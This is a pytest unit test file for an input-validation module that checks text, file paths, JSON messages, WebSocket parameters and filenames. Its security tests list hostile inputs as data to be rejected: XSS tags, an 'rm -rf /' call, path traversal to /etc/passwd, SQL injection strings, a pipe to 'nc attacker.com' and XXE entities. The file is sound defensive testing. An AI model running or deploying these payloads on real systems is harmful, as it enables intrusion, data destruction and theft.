"""
Unit tests for input validation utilities.

Tests input sanitization, injection attack prevention, and safe validation methods.
"""

import pytest
import json
import tempfile
import os
from pathlib import Path
from unittest.mock import Mock, patch

# Add parent directory to path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from utils.validation import (
    ValidationError, InputValidator, safe_filename
)


class TestValidationError:
    """Test suite for ValidationError exception."""
    
    def test_validation_error_creation(self):
        """Test ValidationError creation."""
        error = ValidationError("Test error message", "test_field")
        
        assert error.message == "Test error message"
        assert error.field == "test_field"
        assert str(error) == "Test error message"
    
    def test_validation_error_without_field(self):
        """Test ValidationError without field."""
        error = ValidationError("General error")
        
        assert error.message == "General error"
        assert error.field is None


class TestInputValidator:
    """Test suite for InputValidator class."""
    
    def test_validate_text_success(self):
        """Test successful text validation."""
        # Normal text
        result = InputValidator.validate_text("Hello, world!")
        assert result == "Hello, world!"
        
        # Text with allowed special characters
        result = InputValidator.validate_text("Test 123, with punctuation: yes!")
        assert result == "Test 123, with punctuation: yes!"
        
        # Empty text when allowed
        result = InputValidator.validate_text("", allow_empty=True)
        assert result == ""
        
        # Whitespace trimming
        result = InputValidator.validate_text("  trimmed text  ")
        assert result == "trimmed text"
    
    def test_validate_text_type_error(self):
        """Test text validation with wrong type."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_text(123)
        assert exc_info.value.message == "Text must be a string"
        assert exc_info.value.field == "text"
    
    def test_validate_text_empty_not_allowed(self):
        """Test text validation when empty not allowed."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_text("", allow_empty=False)
        assert exc_info.value.message == "Text cannot be empty"
        
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_text("   ", allow_empty=False)
        assert exc_info.value.message == "Text cannot be empty"
    
    def test_validate_text_length_limit(self):
        """Test text validation with length limit."""
        # Within limit
        result = InputValidator.validate_text("Short text", max_length=20)
        assert result == "Short text"
        
        # Exceeds limit
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_text("A" * 101, max_length=100)
        assert "Text too long" in exc_info.value.message
    
    def test_validate_text_dangerous_patterns(self):
        """Test detection of dangerous patterns."""
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:void(0)",
            "<iframe src='evil.com'></iframe>",
            "onclick='malicious()'",
            "<object data='bad'></object>",
            "<embed src='virus'></embed>",
            "<link href='steal.css'>",
            "<meta http-equiv='refresh'>",
            "eval(dangerous_code)",
            "exec(malicious)",
            "__import__('os').system('rm -rf /')",
            "subprocess.call(['bad'])",
            "os.system('evil command')"
        ]
        
        for dangerous_input in dangerous_inputs:
            with pytest.raises(ValidationError) as exc_info:
                InputValidator.validate_text(dangerous_input)
            assert "potentially dangerous content" in exc_info.value.message
    
    def test_validate_text_unicode(self):
        """Test text validation with Unicode."""
        # Should pass for normal Unicode
        result = InputValidator.validate_text("Hello 世界 🌍")
        assert result == "Hello 世界 🌍"
        
        # Emoji and special characters
        result = InputValidator.validate_text("Test with émojis: 😀 👍 ❤️")
        assert result == "Test with émojis: 😀 👍 ❤️"
    
    def test_validate_file_path_success(self):
        """Test successful file path validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test file
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test content")
            
            # Validate existing file
            result = InputValidator.validate_file_path(str(test_file), must_exist=True)
            assert result == test_file
            
            # Validate non-existent file when not required
            new_file = Path(temp_dir) / "new.txt"
            result = InputValidator.validate_file_path(str(new_file), must_exist=False)
            assert result == new_file
    
    def test_validate_file_path_type_error(self):
        """Test file path validation with wrong type."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_file_path(123)
        assert exc_info.value.message == "File path must be a string"
        assert exc_info.value.field == "file_path"
    
    def test_validate_file_path_empty(self):
        """Test file path validation with empty string."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_file_path("")
        assert exc_info.value.message == "File path cannot be empty"
    
    def test_validate_file_path_traversal(self):
        """Test prevention of path traversal attacks."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/tmp/../../../etc/shadow",
            "safe/../../../dangerous"
        ]
        
        for path in dangerous_paths:
            with pytest.raises(ValidationError) as exc_info:
                InputValidator.validate_file_path(path, must_exist=False)
            assert "Path traversal not allowed" in exc_info.value.message
    
    def test_validate_file_path_allowed_directories(self):
        """Test file path validation within allowed directories."""
        # Should work for home/.voiceflow
        with patch('pathlib.Path.home', return_value=Path("/home/user")):
            with patch('pathlib.Path.exists', return_value=True):
                result = InputValidator.validate_file_path(
                    "/home/user/.voiceflow/test.db", 
                    must_exist=True
                )
                assert str(result) == "/home/user/.voiceflow/test.db"
        
        # Should fail for system directories
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_file_path("/etc/passwd", must_exist=False)
        assert "not in allowed directory" in exc_info.value.message
    
    def test_validate_file_path_extensions(self):
        """Test file path validation with extension restrictions."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Allowed extension
            db_file = Path(temp_dir) / "test.db"
            db_file.touch()
            result = InputValidator.validate_file_path(
                str(db_file), 
                must_exist=True,
                allowed_extensions=['.db', '.sqlite']
            )
            assert result == db_file
            
            # Disallowed extension
            exe_file = Path(temp_dir) / "test.exe"
            exe_file.touch()
            with pytest.raises(ValidationError) as exc_info:
                InputValidator.validate_file_path(
                    str(exe_file),
                    must_exist=True,
                    allowed_extensions=['.db', '.sqlite']
                )
            assert "File extension not allowed" in exc_info.value.message
    
    def test_validate_json_message_success(self):
        """Test successful JSON message validation."""
        # Valid JSON
        message = '{"type": "test", "data": "value"}'
        result = InputValidator.validate_json_message(message)
        assert result == {"type": "test", "data": "value"}
        
        # JSON with various types
        message = '{"type": "complex", "number": 42, "bool": true, "null": null}'
        result = InputValidator.validate_json_message(message)
        assert result["number"] == 42
        assert result["bool"] is True
        assert result["null"] is None
    
    def test_validate_json_message_type_error(self):
        """Test JSON validation with wrong type."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_json_message({"already": "parsed"})
        assert exc_info.value.message == "Message must be a string"
    
    def test_validate_json_message_size_limit(self):
        """Test JSON message size limit."""
        # Large but valid JSON
        large_data = {"type": "test", "data": "A" * 1000}
        large_json = json.dumps(large_data)
        
        # Should pass with default limit
        result = InputValidator.validate_json_message(large_json)
        assert result["data"] == "A" * 1000
        
        # Should fail with small limit
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_json_message(large_json, max_size=100)
        assert "Message too large" in exc_info.value.message
    
    def test_validate_json_message_invalid_format(self):
        """Test JSON validation with invalid format."""
        invalid_jsons = [
            "not json at all",
            '{"unclosed": "quote}',
            '{"type": undefined}',
            "{'single': 'quotes'}",
            '{"trailing": "comma",}'
        ]
        
        for invalid in invalid_jsons:
            with pytest.raises(ValidationError) as exc_info:
                InputValidator.validate_json_message(invalid)
            assert "Invalid JSON format" in exc_info.value.message
    
    def test_validate_json_message_not_object(self):
        """Test JSON validation when not an object."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_json_message('["array", "not", "object"]')
        assert exc_info.value.message == "Message must be a JSON object"
        
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_json_message('"just a string"')
        assert exc_info.value.message == "Message must be a JSON object"
    
    def test_validate_json_message_missing_type(self):
        """Test JSON validation without required type field."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_json_message('{"data": "value"}')
        assert exc_info.value.message == "Message missing 'type' field"
    
    def test_validate_json_message_sanitization(self):
        """Test that string values in JSON are sanitized."""
        message = '{"type": "test", "text": "  needs trimming  "}'
        result = InputValidator.validate_json_message(message)
        assert result["text"] == "needs trimming"
    
    def test_validate_websocket_params_success(self):
        """Test successful WebSocket parameter validation."""
        params = {
            "token": "auth-token-123",
            "client_id": "client-456",
            "version": "1.0.0"
        }
        
        result = InputValidator.validate_websocket_params(params)
        assert result == params
    
    def test_validate_websocket_params_invalid_keys(self):
        """Test WebSocket params with invalid keys."""
        params = {
            "valid_key": "value",
            "123invalid": "skipped",
            "with-dash": "skipped",
            "with space": "skipped",
            "@special": "skipped"
        }
        
        result = InputValidator.validate_websocket_params(params)
        assert result == {"valid_key": "value"}
    
    def test_validate_websocket_params_long_values(self):
        """Test WebSocket params with long values."""
        params = {
            "normal": "short value",
            "too_long": "A" * 1001
        }
        
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_websocket_params(params)
        assert "Parameter 'too_long' too long" in exc_info.value.message
    
    def test_validate_websocket_params_type_checking(self):
        """Test WebSocket params type checking."""
        # Non-string values should be skipped
        params = {
            "string": "value",
            "number": 123,
            "bool": True,
            "none": None,
            "list": ["a", "b"],
            123: "numeric key"
        }
        
        result = InputValidator.validate_websocket_params(params)
        assert result == {"string": "value"}
    
    def test_sanitize_for_display(self):
        """Test text sanitization for display."""
        # Normal text
        result = InputValidator.sanitize_for_display("Normal text")
        assert result == "Normal text"
        
        # Remove dangerous characters
        result = InputValidator.sanitize_for_display("Text with <script> & \"quotes\"")
        assert result == "Text with script  quotes"
        
        # Truncate long text
        long_text = "A" * 150
        result = InputValidator.sanitize_for_display(long_text, max_length=100)
        assert result == "A" * 97 + "..."
        assert len(result) == 100
        
        # Non-string input
        result = InputValidator.sanitize_for_display(12345)
        assert result == "12345"
    
    def test_validate_audio_duration_success(self):
        """Test successful audio duration validation."""
        # Integer duration
        result = InputValidator.validate_audio_duration(30)
        assert result == 30.0
        
        # Float duration
        result = InputValidator.validate_audio_duration(45.5)
        assert result == 45.5
        
        # Zero duration
        result = InputValidator.validate_audio_duration(0)
        assert result == 0.0
    
    def test_validate_audio_duration_type_error(self):
        """Test audio duration validation with wrong type."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_audio_duration("30 seconds")
        assert exc_info.value.message == "Duration must be a number"
        assert exc_info.value.field == "duration"
    
    def test_validate_audio_duration_negative(self):
        """Test audio duration validation with negative value."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_audio_duration(-5.0)
        assert exc_info.value.message == "Duration cannot be negative"
    
    def test_validate_audio_duration_too_long(self):
        """Test audio duration validation exceeding limit."""
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_audio_duration(61.0, max_duration=60.0)
        assert "Duration too long" in exc_info.value.message
        
        # Custom limit
        with pytest.raises(ValidationError) as exc_info:
            InputValidator.validate_audio_duration(121.0, max_duration=120.0)
        assert "Duration too long (max 120.0s)" in exc_info.value.message


class TestSafeFilename:
    """Test suite for safe_filename function."""
    
    def test_safe_filename_normal(self):
        """Test safe filename with normal input."""
        assert safe_filename("document.txt") == "document.txt"
        assert safe_filename("my-file_123.pdf") == "my-file_123.pdf"
    
    def test_safe_filename_dangerous_chars(self):
        """Test safe filename removes dangerous characters."""
        assert safe_filename("../../etc/passwd") == "______etc_passwd.txt"
        assert safe_filename("file<>:\"|?*.txt") == "file_______.txt"
        assert safe_filename("spaces and special!@#.doc") == "spaces_and_special___.doc"
    
    def test_safe_filename_length_limit(self):
        """Test safe filename length limiting."""
        long_name = "a" * 150 + ".txt"
        result = safe_filename(long_name)
        assert len(result) == 100
        assert result.endswith(".txt")
    
    def test_safe_filename_no_extension(self):
        """Test safe filename adds extension when missing."""
        assert safe_filename("noextension") == "noextension.txt"
        assert safe_filename("also_no_ext") == "also_no_ext.txt"
    
    def test_safe_filename_preserves_extension(self):
        """Test safe filename preserves existing extension."""
        assert safe_filename("file.pdf") == "file.pdf"
        assert safe_filename("archive.tar.gz") == "archive.tar.gz"
    
    def test_safe_filename_edge_cases(self):
        """Test safe filename edge cases."""
        # Empty string
        assert safe_filename("") == ".txt"
        
        # Only dangerous characters
        assert safe_filename("<<<>>>") == "______.txt"
        
        # Hidden file
        assert safe_filename(".hidden") == ".hidden"
        
        # Multiple dots
        assert safe_filename("file...name...txt") == "file...name...txt"


class TestValidationSecurityScenarios:
    """Test security-specific validation scenarios."""
    
    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attempts."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM transcriptions WHERE 1=1",
            "' UNION SELECT * FROM passwords --"
        ]
        
        for injection in sql_injections:
            # Should either sanitize or reject
            try:
                result = InputValidator.validate_text(injection)
                # If it passes, dangerous SQL keywords should be intact
                # (we're not modifying the text, just validating it's safe)
                assert "DROP TABLE" not in result or "script" in result.lower()
            except ValidationError:
                # Some patterns might be rejected entirely
                pass
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attempts."""
        command_injections = [
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "test | nc attacker.com 1234"
        ]
        
        for injection in command_injections:
            # File paths should reject these
            with pytest.raises(ValidationError):
                InputValidator.validate_file_path(injection, must_exist=False)
    
    def test_xxe_prevention(self):
        """Test prevention of XML External Entity attacks."""
        xxe_payloads = [
            '{"type": "test", "data": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>"}',
            '{"type": "test", "xml": "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY test SYSTEM \\"file:///etc/passwd\\">]>"}',
        ]
        
        for payload in xxe_payloads:
            # Should pass JSON validation but dangerous content should be sanitized
            result = InputValidator.validate_json_message(payload)
            assert "DOCTYPE" not in str(result) or "ENTITY" not in str(result)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])